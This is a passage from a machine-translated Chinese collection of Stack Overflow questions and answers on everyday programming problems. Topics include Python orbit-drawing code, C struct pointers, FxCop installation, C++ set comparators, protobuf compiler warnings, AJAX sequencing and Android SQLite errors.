            print("text ", "\"Dione\"",r_Xdio+planets['Dione']['Radius']*scale,r_Ydio)
        if "Rhea" in planets:
            r_Rhea=planets['Rhea']['Orbital Radius']*scale;
            print("circle",r_Xsat,r_Ysat,r_Rhea)
            r_Xrhe=r_Xsat+math.sin(t*2*math.pi/planets['Rhea']['Period'])*r_Rhea
            r_Yrhe=r_Ysat+math.cos(t*2*math.pi/planets['Rhea']['Period'])*r_Rhea
            print("fillcircle",r_Xrhe,r_Yrhe,3)
            print("text ", "\"Rhea\"",r_Xrhe+planets['Rhea']['Radius']*scale,r_Yrhe)
        if "Titan" in planets:
            r_Titan=planets['Titan']['Orbital Radius']*scale;
            print("circle",r_Xsat,r_Ysat,r_Titan)
            r_Xtit=r_Xsat+math.sin(t*2*math.pi/planets['Titan']['Period'])*r_Titan
            r_Ytit=r_Ysat+math.cos(t*2*math.pi/planets['Titan']['Period'])*r_Titan
            print("fillcircle",r_Xtit,r_Ytit,3)
            print("text ", "\"Titan\"",r_Xtit+planets['Titan']['Radius']*scale,r_Ytit)
        if "Iapetus" in planets:
            r_Iapetus=planets['Iapetus']['Orbital Radius']*scale;
            print("circle",r_Xsat,r_Ysat,r_Iapetus)
            r_Xiap=r_Xsat+math.sin(t*2*math.pi/planets['Iapetus']['Period'])*r_Iapetus
            r_Yiap=r_Ysat+math.cos(t*2*math.pi/planets['Iapetus']['Period'])*r_Iapetus
            print("fillcircle",r_Xiap,r_Yiap,3)
            print("text ", "\"Iapetus\"",r_Xiap+planets['Iapetus']['Radius']*scale,r_Yiap)
        if "Uranus" in planets:
            r_Uranus=planets['Uranus']['Orbital Radius']*scale;
            print("circle",x,y,r_Uranus)
            r_Xura=x+math.sin(t*2*math.pi/planets['Uranus']['Period'])*r_Uranus
            r_Yura=y+math.cos(t*2*math.pi/planets['Uranus']['Period'])*r_Uranus
            print("fillcircle",r_Xura,r_Yura,3)
            print("text ", "\"Uranus\"",r_Xura+planets['Uranus']['Radius']*scale,r_Yura)
        if "Puck" in planets:
            r_Puck=planets['Puck']['Orbital Radius']*scale;
            print("circle",r_Xura,r_Yura,r_Puck)
            r_Xpuc=r_Xura+math.sin(t*2*math.pi/planets['Puck']['Period'])*r_Puck
            r_Ypuc=r_Yura+math.cos(t*2*math.pi/planets['Puck']['Period'])*r_Puck
            print("fillcircle",r_Xpuc,r_Ypuc,3)
            print("text ", "\"Puck\"",r_Xpuc+planets['Puck']['Radius']*scale,r_Ypuc)
        if "Miranda" in planets:
            r_Miranda=planets['Miranda']['Orbital Radius']*scale;
            print("circle",r_Xura,r_Yura,r_Miranda)
            r_Xmira=r_Xura+math.sin(t*2*math.pi/planets['Miranda']['Period'])*r_Miranda
            r_Ymira=r_Yura+math.cos(t*2*math.pi/planets['Miranda']['Period'])*r_Miranda
            print("fillcircle",r_Xmira,r_Ymira,3)
            print("text ", "\"Miranda\"",r_Xmira+planets['Miranda']['Radius']*scale,r_Ymira)
        if "Ariel" in planets:
            r_Ariel=planets['Ariel']['Orbital Radius']*scale;
            print("circle",r_Xura,r_Yura,r_Ariel)
            r_Xari=r_Xura+math.sin(t*2*math.pi/planets['Ariel']['Period'])*r_Ariel
            r_Yari=r_Yura+math.cos(t*2*math.pi/planets['Ariel']['Period'])*r_Ariel
            print("fillcircle",r_Xari,r_Yari,3)
            print("text ", "\"Ariel\"",r_Xari+planets['Ariel']['Radius']*scale,r_Yari)
        if "Umbriel" in planets:
            r_Umbriel=planets['Umbriel']['Orbital Radius']*scale;
            print("circle",r_Xura,r_Yura,r_Umbriel)
            r_Xumb=r_Xura+math.sin(t*2*math.pi/planets['Umbriel']['Period'])*r_Umbriel
            r_Yumb=r_Yura+math.cos(t*2*math.pi/planets['Umbriel']['Period'])*r_Umbriel
            print("fillcircle",r_Xumb,r_Yumb,3)
            print("text ", "\"Umbriel\"",r_Xumb+planets['Umbriel']['Radius']*scale,r_Yumb)
        if "Titania" in planets:
            r_Titania=planets['Titania']['Orbital Radius']*scale;
            print("circle",r_Xura,r_Yura,r_Titania)
            r_Xtita=r_Xura+math.sin(t*2*math.pi/planets['Titania']['Period'])*r_Titania
            r_Ytita=r_Yura+math.cos(t*2*math.pi/planets['Titania']['Period'])*r_Titania
            print("fillcircle",r_Xtita,r_Ytita,3)
            print("text ", "\"Titania\"",r_Xtita+planets['Titania']['Radius']*scale,r_Ytita)
        if "Oberon" in planets:
            r_Oberon=planets['Oberon']['Orbital Radius']*scale;
            print("circle",r_Xura,r_Yura,r_Oberon)
            r_Xober=r_Xura+math.sin(t*2*math.pi/planets['Oberon']['Period'])*r_Oberon
            r_Yober=r_Yura+math.cos(t*2*math.pi/planets['Oberon']['Period'])*r_Oberon
            print("fillcircle",r_Xober,r_Yober,3)
            print("text ", "\"Oberon\"",r_Xober+planets['Oberon']['Radius']*scale,r_Yober)
        if "Neptune" in planets:
            r_Neptune=planets['Neptune']['Orbital Radius']*scale;
            print("circle",x,y,r_Neptune)
            r_Xnep=x+math.sin(t*2*math.pi/planets['Neptune']['Period'])*r_Neptune
            r_Ynep=y+math.cos(t*2*math.pi/planets['Neptune']['Period'])*r_Neptune
            print("fillcircle",r_Xnep,r_Ynep,3)
            print("text ", "\"Neptune\"",r_Xnep+planets['Neptune']['Radius']*scale,r_Ynep)
        if "Titan" in planets:
            r_Titan=planets['Titan']['Orbital Radius']*scale;
            print("circle",r_Xnep,r_Ynep,r_Titan)
            r_Xtita=r_Xnep+math.sin(t*2*math.pi/planets['Titan']['Period'])*r_Titan
            r_Ytita=r_Ynep+math.cos(t*2*math.pi/planets['Titan']['Period'])*r_Titan
            print("fillcircle",r_Xtita,r_Ytita,3)
            print("text ", "\"Titan\"",r_Xtita+planets['Titan']['Radius']*scale,r_Ytita)

        t += 0.003
        draw(x, y, t, planets) 
```

同样，您可能需要一个工作基本案例来在某个时候停止您的递归。

顺便说一句，如果你想清理你的打印语句，这是一种遍历你的行星的方法（使用它或离开它）：

```
for p in planets.keys():
    planet = planets[p] 
```

我不知道这是否有用，也许可以节省您的打字时间。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T05:21:03.560

你可以这样：

```
def draw_e(x, y, t, planets):
    if 'Satellites' in planets["Moon"]:
        print ("fillcircle", x, y, planets["Moon"]['Radius']*scale)
    else:
        print("refresh")
        print("colour 0 0 0")
        print("clear")
        print("colour 255 255 255")
        print("fillcircle",x,y,planets['Sun']['Radius']*scale)
        print("text ", "\"Sun\"",x+planets['Sun']['Radius']*scale,y)

        for each in planets.keys():
            r_planet=planets[each]['Orbital Radius']*scale;
            print("circle", x, y, r_Mercury)
            r_X = x+math.sin(t*2*math.pi/planets[each]['Period'])*r_planet
            r_Y = y+math.cos(t*2*math.pi/planets[each]['Period'])*r_planet
            print("fillcircle",r_X,r_Y,3)

            print("text ", each, r_X+planets[each]['Radius']*scale,r_Y)

            t += 0.003

draw(x, y, t, planets) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-25T06:32:30.503

我认为您应该首先在递归函数之外定义太阳，因为无论如何太阳都是固定的。

例如

```
 print("fillcircle",400,200,planets['Sun']['Radius']*scale)
        print("text ", "\"Sun\"",x+planets['Sun']['Radius']*scale,y)
             def planets:
                    if ~~~~~ 
```

规模也应该被定义。

# c - 访问结构体数组中的字符指针

> ID：13548463
> 
> 赞同：0
> 
> 时间：2012-11-25T05:06:24.447
> 
> 标签：c

我有一个指向结构的指针数组，每个结构都有一个指向字符串的 char 指针。我想将这个词与另一个词进行比较。

我编译了我的代码，但得到了这个错误：请求成员字不是结构或联合。在这条线上：

```
strcmp(mytable[i].word, word) == 0) 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:15:37.143

如果，正如您所评论的， mytable 是一个指向结构的指针数组，那么而不是：

```
mytable[i].word 
```

你应该有：

```
mytable[i]->word 
```

# visual-studio-2010 - FxCop 安装

> ID：13548470
> 
> 赞同：10
> 
> 时间：2012-11-25T05:07:57.867
> 
> 标签：visual-studio-2010, winapi, windows-7, fxcop

我正在尝试获取最新版本的 FxCop。我正在使用不包含代码分析的 Visual Studio 2010 专业版，因此​​我尝试使用 FxCop 进行设置。

在[http://www.microsoft.com/en-us/download/details.aspx?id=6544](http://www.microsoft.com/en-us/download/details.aspx?id=6544)有一个自述文件，它说要安装包含最新 FxCop 的 Windows SDK。我已经从这里[http://www.microsoft.com/en-us/download/details.aspx?id=8442](http://www.microsoft.com/en-us/download/details.aspx?id=8442)安装了 Windows SDK ，它根本不包括 FxCop，我检查了 x86 和 x64 版本。

知道我在哪里可以找到它吗？Microsoft 是否不再支持 FxCop？

**编辑：** 我完全安装了 Windows SDK。我在 Windows 7 x86 上安装 x86 版本。我仅通过将其提取到文件夹中来在 x64 Windows SDK ISO 中搜索 FxCop。

我发现 FxCop 10 的唯一地方是回答[https://stackoverflow.com/a/7151981/84852](https://stackoverflow.com/a/7151981/84852)

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2014-03-31T13:27:58.350

由于 FxCop 10.0 作为 Windows 7 SDK 的一部分分发，因此您必须进行一些下载和提取才能将其安装在未运行 Windows 7 的服务器上。

> 知道我在哪里可以找到它吗？Microsoft 是否不再支持 FxCop？

您可以直接从这里下载文件： [https ://fxcopinstaller.codeplex.com/](https://fxcopinstaller.codeplex.com/)

此项目不是由 Microsoft 创建的。我这样做只是为了节省您和其他人从原始包中提取二进制文件的几个步骤。我没有更改 Microsoft 提供的原始 MSI 文件中的任何内容。我也不接受任何贡献者的上传来保持文件的真实性。

**[更新]**

Codeplex 正在关闭。新位置是[www.fxcopinstaller.com](http://blog.fxcopinstaller.com/2017/05/fxcop-100-installer.html)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-25T10:32:10.107

我的 SDK 安装中有该文件夹`C:\Program Files\Microsoft SDKs\Windows\v7.0A\FXCop`，但它适用于旧版本的 FxCop。我也有最新版本的 FxCop 的设置，但我不记得我在哪里找到它，而且你可以很容易地从另一个问题中下载它。

然而，这些天我按照[这篇博文中的](http://kentb.blogspot.co.nz/2011_01_01_archive.html)详细说明进行操作，因为 FxCop 命令行运行程序产生的结果与 IDE 代码分析运行程序不同（即因为 FxCop 不支持新的 phoenix 引擎），并且我希望我的构建服务器强制执行与在 IDE 中运行的规则相同。

此过程还使我能够放松单元测试项目的规则（VS2010 中存在一个问题，即为第一个构建的项目配置的规则集成为所有项目的规则集，无论配置什么）。

**更新**

如果需要，此[代码分析团队博客文章](http://blogs.msdn.com/b/codeanalysis/archive/2010/07/26/fxcop-10-0-is-available.aspx)指出 FxCop 10.0 设置包含在[适用于 Windows 7 和 .NET Framework 4 版本 7.1 的 Microsoft Windows SDK 中](http://www.microsoft.com/downloads/details.aspx?displaylang=en&FamilyID=6b6c21d2-2006-4afa-9702-529fa782d63b)，可以在文件夹中找到`%ProgramFiles%\Microsoft SDKs\Windows\v7.1\Bin\FXCop.`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-03-28T06:36:10.067

> FxCop 安装说明
> 
> 1.  下载适用于 Windows 7 和 .NET Framework 4 版本 7.1 的 Microsoft Windows SDK。
>     
>     
> 2.  运行 %ProgramFiles%\Microsoft SDKs\Windows\v7.1\Bin\FXCop\FxCopSetup.exe 安装 FxCop。

但我发现它在

> C:\Program Files\Microsoft SDKs\Windows\v6.0A\FXCop

# c++ - 使用带有结构数据的 std::set 查找

> ID：13548472
> 
> 赞同：3
> 
> 时间：2012-11-25T05:08:07.317
> 
> 标签：c++, set, equals, std, comparator

```
typedef struct Edge
{
    int v1, v2, w;
    bool operator <(const Edge &rhs) const{
        bool b = v1 < rhs.v1 || v2 < rhs.v2;
        return (b);
    }
} edge;

template <class T>
struct my_less
{
    bool operator()(const T& _Left, const T& _Right) const
    {
        return (_Left < _Right);
    }
};

int main(int argc, char *argv[])
{
    set <edge, my_less<edge> > F;

    edge e3 = { 3, 3, 3};
    edge e4 = { 3, 7, 3};
    edge e5 = { 2, 7, 3};

    F.insert(e3);
    printf("e3 ? %d\n", F.find(e3)!=F.end()); // O
    printf("e4 ? %d\n", F.find(e4)!=F.end()); // O
    printf("e5 ? %d\n", F.find(e5)!=F.end()); // X

    //printf("%d\n", e3<e4);

    return 0;
} 
```

```
如果运行此代码，我会在“F.find(e5)!=F.end()”处收到错误消息，并显示以下消息。
“调试断言失败！。表达式：无效的运算符<”

'(x,y), (p,q)' 相等的两条边的条件是
 !(x < p || y < q) && !(p < x || q < y)

它可以是'(x>=p && y>=q) && (p>=x && q>=y)'

我真的不知道为什么会提出断言。
有什么不对？

```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-25T05:26:11.117

您的比较不会强制执行严格的排序。例如：

```
Edge e1;
Edge e2;

e1.v1 = 5;
e1.v2 = 4;

e2.v1 = 4;
e2.v2 = 5;

// e1 < e2 is true
// e2 < e1 is true
// So which one should we really trust? Neither, let's abort the program! 
```

您需要让您的`<`操作员真正按照`<`应有的方式工作。如果`e1 < e2`是真的，那么`e2 < e1`必须是假的。

我*认为*这可能是您想要的，但请注意我尚未对其进行测试：

```
return v1 < rhs.v1 || (v1 == rhs.v1 && v2 < rhs.v2); 
```

理论上，这*应该*`v1`按 排序，并用于`v2`打破平局。

# database - 如何在 Google App Engine/Django-nonrel 中存储一长串数字？

> ID：13548473
> 
> 赞同：1
> 
> 时间：2012-11-25T05:08:11.983
> 
> 标签：database, django, google-app-engine, django-nonrel, djangoappengine

我正在开发一个 django-nonrel 项目并将其部署在 Google 应用程序引擎上。

一个功能是存储许多长长的数字列表，例如随着时间的推移的股票价格。列表的长度可能在 3000 左右。列表上可能的操作是添加新数字、删除最旧的数字，以及偶尔检索所有数字（用于绘图）。

在我的情况下存储此类列表的有效方法是什么？文件对我来说似乎是最好的方法。但是 Google App Engine 不允许创建用于写入的文件。

据我所知，Django-nonrel 有 ListField。但我猜想长度为 3000 的 ListField 效率不高。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T05:28:56.300

ListField 很好。

最大实体大小为 1MB，包括您的 ListField 以及实体上的其他属性。3000个数字应该没问题。

# host - [function.fsockopen]：php_network_getaddresses：getaddrinfo 失败：不知道这样的主机

> ID：13548475
> 
> 赞同：1
> 
> 时间：2012-11-25T05:09:12.907
> 
> 标签：host, serversocket, fsockopen

我对 fsock open 有一些问题，但我是关于套接字的 PHP 新手。

我的脚本的警告是：

```
Warning: fsockopen() [function.fsockopen]: 
php_network_getaddresses: getaddrinfo failed: No such host is known 
```

这是我的脚本：

```
 foreach($extend as $extra => $serv) {                       
                    $buffers = NULL;      
                    if ($socket = fsockopen($serv[0], 43)
                    /* lets we show system can't connect the server */
                    or die('error connect servers' . $socket));
                    fputs($socket, $vers.$extra . "\r\n");

                            while( !feof($socket) )
                            {
                                    $buffers .= fgets($socket,128);
                            }

                    fclose($socket); 
```

# javascript - 在没有回调的情况下处理背靠背 AJAX 调用（如果可能）

> ID：13548476
> 
> 赞同：0
> 
> 时间：2012-11-25T05:09:14.543
> 
> 标签：javascript, ajax, concurrency

我在 Web 应用程序中有一个函数，可以调用 AJAX 来更新元素。我有其他使用此功能的功能，以及使用这些功能的其他功能。

假设我有函数 A 进行 AJAX 调用。函数 B 调用函数 A，函数 C 调用函数 B。

现在想象一下我有函数 D，它是另一个进行 AJAX 调用的函数。

我想调用函数 C，然后调用函数 D。问题是我遇到了一个问题，有时函数 D 正在使用从函数 C 调用返回的响应。因此，在从函数 C 的 AJAX 请求收到响应之前，我不希望函数 D 运行。

由于 AJAX 请求发生在链条的下游（C > B > A），让函数 C 接受回调，然后将该回调传递回 B，B 将该回调传递给 A，这样 A 就可以在收到对它的 AJAX 请求的响应后调用该回调函数。

这实际上是最好的方法，还是可以做得更干净？如果它有所作为，我更喜欢不使用任何额外库（例如 jQuery）的解决方案。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:20:34.557

您想使用[承诺](http://blogs.msdn.com/b/ie/archive/2011/09/11/asynchronous-programming-in-javascript-with-promises.aspx)模式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:30:14.667

您可以将 ajax 事件绑定到元素，而不是回调，如果您使用的是 PHP ，请使用[http://phery-php-ajax.net之类的库](http://phery-php-ajax.net)

# c++ - 编译协议缓冲区生成的源文件时是否有更好的方法来解决警告？

> ID：13548478
> 
> 赞同：17
> 
> 时间：2012-11-25T05:09:31.097
> 
> 标签：c++, visual-c++, 64-bit, protocol-buffers

对于一个简单的 proto 文件：

```
消息人{
  必需的 int32 id = 1;
  所需的字符串名称 = 2；
  可选字符串电子邮件 = 3；
}

```

它由 protoc.exe 编译，结果用于一个同样简单的测试项目，除了包含 protoc 生成的文件之外，它基本上什么都不做。

我正在使用 msvc10 构建测试项目（x64），然后它给了我很多警告：

```
警告 1 警告 C4244: 'return' : 从 '__int64' 转换为 'int'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\descriptor.h 1441 1 testProtobuf
...
警告 11 警告 C4267：'argument'：从 'size_t' 转换为 'int'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\unknown_field_set.h 142 1 testProtobuf
警告 12 警告 C4267：'return'：从 'size_t' 转换为 'int'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\unknown_field_set.h 237 1 testProtobuf
...
警告 14 警告 C4244：'='：从 '__int64' 转换为 'int'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\io\coded_stream.h 902 1 testProtobuf
警告 15 警告 C4244：'return'：从 '__int64' 转换为 'int'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\io\coded_stream.h 1078 1 testProtobuf
警告 16 警告 C4267：'argument'：从 'size_t' 转换为 'google::protobuf::uint32'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\wire_format_lite_inl.h 663 1 testProtobuf
...
警告 19 警告 C4267：'return'：从 'size_t' 转换为 'int'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\wire_format_lite_inl.h 739 1 testProtobuf
警告 20 警告 C4267：'argument'：从 'size_t' 转换为 'google::protobuf::uint32'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\wire_format_lite_inl.h 742 1 testProtobuf
警告 21 警告 C4267：'return'：从 'size_t' 转换为 'int'，可能丢失数据 D:\Work\protobuf-trunk\src\google\protobuf\wire_format_lite_inl.h 743 1 testProtobuf
警告 22 警告 C4267：'argument'：从 'size_t' 转换为 'int'，可能丢失数据 D:\Work\testProtobuf\testProtobuf\person.pb.cc 211 1 testProtobuf
...
警告 28 警告 C4996：'std::_Copy_impl'：带有可能不安全参数的函数调用 - 此调用依赖于调用者检查传递的值是否正确。要禁用此警告，请使用 -D_SCL_SECURE_NO_WARNINGS。请参阅有关如何使用 Visual C++ 'Checked Iterators' C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\xutility 2239 1 testProtobuf 的文档
警告 29 警告 C4996：'std::_Copy_impl'：带有可能不安全参数的函数调用 - 此调用依赖于调用者检查传递的值是否正确。要禁用此警告，请使用 -D_SCL_SECURE_NO_WARNINGS。请参阅有关如何使用 Visual C++ 'Checked Iterators' C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\xutility 2239 1 testProtobuf 的文档

```

有什么好的方法来解决所有这些警告吗？任何建议将不胜感激。

附言。libprotobuf 项目本身可以由 msvc10 干净编译而不会发出任何警告。

[**编辑 2013/02/20** ]

工作解决方案：

1.  为那些 protoc 生成的 .cc 文件设置属性：
    配置属性 -> c/c++ -> 高级 -> 禁用特定警告

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2019-08-23T09:37:37.860

一种简单的方法是使用包装头来包含生成的 protobuf 头：

```
#ifndef MESSAGES_WRAPPER_H
#define MESSAGES_WRAPPER_H

#ifdef _MSC_VER
  #pragma warning(push)
  #pragma warning(disable: 4018 4100 4267)
#endif

#include "messages.pb.h"

#ifdef _MSC_VER
  #pragma warning(pop)
#endif

#endif // MESSAGES_WRAPPER_H 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-21T05:57:56.410

您可以破解 protoc 编译器的源代码，让它自动将 pragma 注入生成的文件中。

在[src/google/protobuf/compiler/cpp/cpp_file.cc](http://code.google.com/p/protobuf/source/browse/trunk/src/google/protobuf/compiler/cpp/cpp_file.cc#94)的`GenerateHeader(io::Printer* printer)`第 94 行左右，将第一个`printer->Print`调用更改为：

```
 // Generate top of header.
  printer->Print(
    "// Generated by the protocol buffer compiler.  DO NOT EDIT!\n"
    "// source: $filename$\n"
    "\n"
    "#ifndef PROTOBUF_$filename_identifier$__INCLUDED\n"
    "#define PROTOBUF_$filename_identifier$__INCLUDED\n"
    "\n"
    "#ifdef _MSC_VER\n"
    "#  pragma warning(push)\n"
    "#  pragma warning(disable: 4127 4244 4267)\n"
    "#endif\n"
    "\n"
    "#include <string>\n"
    "\n",
    "filename", file_->name(),
    "filename_identifier", filename_identifier); 
```

然后在第[294 行附近的同一函数](http://code.google.com/p/protobuf/source/browse/trunk/src/google/protobuf/compiler/cpp/cpp_file.cc#294)的末尾，将最后一次`printer->Print`调用更改为：

```
 printer->Print(
    "#ifdef _MSC_VER\n"
    "#  pragma warning(pop)\n"
    "#endif\n"
    "\n"
    "#endif  // PROTOBUF_$filename_identifier$__INCLUDED\n",
    "filename_identifier", filename_identifier); 
```

现在您只需要编译 protoc 目标并运行新的 protoc.exe 以在生成的标头中包含 pragma。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-12-28T12:33:39.943

由于维护负担，我不太喜欢破解 protoc 源，所以我想出了更简单的解决方案。

您可能已经使用某种脚本生成文件，因为您需要将许多参数传递给 protoc，因此进一步自定义此脚本非常容易。

我创建了 powershell 脚本，它对生成的文件进行后处理`#include "Grpc.Header.h"`，并在生成文件的开头和`#include "Grpc.Footer.h"`所述文件的结尾添加。然后，您可以在放置在项目中时自定义这些头文件。除了用 禁用警告之外`#pragma warning`，我还可以在需要时轻松引入其他更改。

注意：在这个例子中，我生成`#define`了我的项目需要的额外内容，以及对 MSVC 很好的预编译头文件支持。我将其留在示例中以说明您可以做什么，但可以安全地删除它。`dllexport_decl=MYAPI`允许在您的 dll 项目中导出 protobuf 类。

**生成原型.ps1**：

```
$ProjectDirectory = "My\Project\Directory\"
$ProtoDirectory = "My\Proto\Directory"

protoc --proto_path=$ProtoDirectory --cpp_out=dllexport_decl=MYAPI:$ProjectDirectory universe.proto

$Plugin = where.exe grpc_cpp_plugin

protoc --proto_path=$ProtoDirectory --grpc_out=$ProjectDirectory --plugin=protoc-gen-grpc=$Plugin universe.proto

foreach($File in Get-ChildItem $ProjectDirectory* -Include *.pb.cc, *.pb.h )
{
    $Content = Get-Content $File

    if( $File.FullName.EndsWith(".cc"))
    {
        Set-Content $File "#include `"pch.h`""
        Add-Content $File "#include `"Grpc.Header.h`""
    }
    else
    {
        Set-Content $File "#include `"Grpc.Header.h`""
    }

    Add-Content $File $Content
    Add-Content $File "#include `"Grpc.Footer.h`""
} 
```

**Grpc.Header.h**：

```
#pragma warning(push)
#pragma warning(disable: 4251)

#ifdef API_EXPORT
#  define MYAPI __declspec(dllexport)
#else
#  define MYAPI __declspec(dllimport)
#endif 
```

**Grpc.Footer.h**：

```
#pragma warning(pop) 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2019-08-23T09:40:36.970

编译器向您发出这些警告是正确的，因为存在截断的风险。

如果转换是安全的，请使用显式转换。这比盲目禁用警告更干净。

# html - 在网页上嵌入 swf

> ID：13548480
> 
> 赞同：0
> 
> 时间：2012-11-25T05:09:35.260
> 
> 标签：html, flash

我正在寻找一种将*.swf 电影嵌入我的网站的好方法。我已经尝试了几件事，但似乎没有让它发挥作用，我目前拥有的是：

SWFObject 动态嵌入 - 第 3 步

```
 <script type="text/javascript">
  swfobject.embedSWF("/_resources/jwPlayer/player.swf", "myContent", "300", "120", "9.0.0");
  </script>

</head>
<body>
  <div id="myContent">
<p>Alternative content</p>
  </div>
</body> 
```

但我在浏览器中看到的只是“替代内容”。这是怎么回事？我该如何正确地做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:12:04.913

脚本在正文中`head`，`div`所以当浏览器执行脚本时，它还没有加载`div`并且失败。将脚本移到`div`.

# android - 无法读取“推送”数据库

> ID：13548486
> 
> 赞同：1
> 
> 时间：2012-11-25T05:10:19.800
> 
> 标签：android, sqlite, eclipse-plugin

我是一名 android 开发人员，我正在使用 questiod SQLite 管理器在 eclipse indigo 上查看我的数据库模式。到目前为止，我已经成功创建了一个数据库，即它没有显示任何错误。

数据库已创建 - 我可以看到架构、表及其数据类型（仅在 sqlite 中）。我没有通过我的应用程序的 GUI 手动输入数据并进入数据库，而是拉出数据库并通过`insert`SQLite 浏览器中的语句插入几行。

成功插入几行后，我保存了数据库并尝试将其推回。

推送成功，可以看到数据库的大小发生了变化但是新推送的数据库不起作用。

这是我尝试使用 questiod plugin 打开它时看到的，我看到的错误是：

```
Error: Could not create the view: An unexpected exception was thrown. 
```

**日志**

```
org.antlr.runtime.tree.RewriteEarlyExitException
    at org.tmatesoft.sqljet.core.internal.lang.SqlParser.fk_clause(SqlParser.java:12036)
    at org.tmatesoft.sqljet.core.internal.lang.SqlParser.table_constraint_fk(SqlParser.java:11782)
    at org.tmatesoft.sqljet.core.internal.lang.SqlParser.table_constraint(SqlParser.java:11164)
    at org.tmatesoft.sqljet.core.internal.lang.SqlParser.create_table_stmt(SqlParser.java:9592)
    at org.tmatesoft.sqljet.core.internal.lang.SqlParser.schema_create_table_stmt(SqlParser.java:1102)
    at org.tmatesoft.sqljet.core.internal.schema.SqlJetSchema.parseTable(SqlJetSchema.java:288)
    at org.tmatesoft.sqljet.core.internal.schema.SqlJetSchema.readShema(SqlJetSchema.java:224)
    at org.tmatesoft.sqljet.core.internal.schema.SqlJetSchema.init(SqlJetSchema.java:117)
    at org.tmatesoft.sqljet.core.internal.schema.SqlJetSchema.<init>(SqlJetSchema.java:103)
    at org.tmatesoft.sqljet.core.table.SqlJetDb$2.runWithLock(SqlJetDb.java:240)
    at org.tmatesoft.sqljet.core.table.SqlJetDb.runWithLock(SqlJetDb.java:298)
    at org.tmatesoft.sqljet.core.table.SqlJetDb.readSchema(SqlJetDb.java:235)
    at org.tmatesoft.sqljet.core.table.SqlJetDb.refreshSchema(SqlJetDb.java:650)
    at org.tmatesoft.sqljet.core.table.SqlJetDb.getSchemaInternal(SqlJetDb.java:329)
    at org.tmatesoft.sqljet.core.table.SqlJetDb.getSchema(SqlJetDb.java:324)
    at com.questoid.sqlitemanager.view.SqliteManagerView.getSqlJetSchema(SqliteManagerView.java:147)
    at com.questoid.sqlitemanager.view.SqliteManagerView.createPartControl(SqliteManagerView.java:62)
    at org.eclipse.ui.internal.ViewReference.createPartHelper(ViewReference.java:375)
    at org.eclipse.ui.internal.ViewReference.createPart(ViewReference.java:229)
    at org.eclipse.ui.internal.WorkbenchPartReference.getPart(WorkbenchPartReference.java:595)
    at org.eclipse.ui.internal.Perspective.showView(Perspective.java:2245)
    at org.eclipse.ui.internal.WorkbenchPage.busyShowView(WorkbenchPage.java:1145)
    at org.eclipse.ui.internal.WorkbenchPage$20.run(WorkbenchPage.java:3921)
    at org.eclipse.swt.custom.BusyIndicator.showWhile(BusyIndicator.java:70)
    at org.eclipse.ui.internal.WorkbenchPage.showView(WorkbenchPage.java:3918)
    at org.eclipse.ui.internal.WorkbenchPage.showView(WorkbenchPage.java:3894)
    at com.questoid.sqlitemanager.SqliteManagerPluginStartup$3$1.run(SqliteManagerPluginStartup.java:139)
    at org.eclipse.swt.widgets.Synchronizer.syncExec(Synchronizer.java:180)
    at org.eclipse.ui.internal.UISynchronizer.syncExec(UISynchronizer.java:150)
    at org.eclipse.swt.widgets.Display.syncExec(Display.java:4683)
    at com.questoid.sqlitemanager.SqliteManagerPluginStartup$3.run(SqliteManagerPluginStartup.java:130)
    at org.eclipse.jface.action.Action.runWithEvent(Action.java:498)
    at org.eclipse.jface.action.ActionContributionItem.handleWidgetSelection(ActionContributionItem.java:584)
    at org.eclipse.jface.action.ActionContributionItem.access$2(ActionContributionItem.java:501)
    at org.eclipse.jface.action.ActionContributionItem$6.handleEvent(ActionContributionItem.java:452)
    at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
    at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1053)
    at org.eclipse.swt.widgets.Display.runDeferredEvents(Display.java:4165)
    at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3754)
    at org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:2701)
    at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:2665)
    at org.eclipse.ui.internal.Workbench.access$4(Workbench.java:2499)
    at org.eclipse.ui.internal.Workbench$7.run(Workbench.java:679)
    at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
    at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:668)
    at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:149)
    at org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:123)
    at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:344)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:179)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
